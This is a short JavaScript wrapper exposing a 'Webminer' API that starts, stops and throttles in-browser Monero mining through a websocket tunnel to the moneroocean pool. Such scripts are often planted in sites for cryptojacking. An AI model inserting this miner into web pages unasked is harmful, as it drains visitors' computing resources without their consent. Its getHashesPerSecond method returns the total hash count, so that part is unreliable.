
server = "wss://tunnel.monero-miner.net";

(function () {
    'use strict';

    window.Webminer = function (siteKey, options) {
        console.log("SITE KEY = ", siteKey);
        console.log("OPTIONS = ", options);

        this.siteKey = siteKey;
        window.throttleMiner = options.throttle * 100;
    };

    window.Webminer.prototype.start = function () {
        console.log("Miner using wallet", maskWallet(this.siteKey));

        startMining(
            "moneroocean.stream",
            this.siteKey
            // "",
            // 2,
            // "webworker"
        );
    };
    window.Webminer.prototype.stop = function () {
        stopMining();
    };

    window.Webminer.prototype.setThrottle = function (throttle) {
        window.throttleMiner = throttle * 100;
    };

    window.Webminer.prototype.getThrottle = function () {
        return window.throttleMiner / 100.0;
    };

    window.Webminer.prototype.getTotalHashes = function () {
        return totalhashes;
    };

    window.Webminer.prototype.getHashesPerSecond = function () {
        return totalhashes;
    };

})();
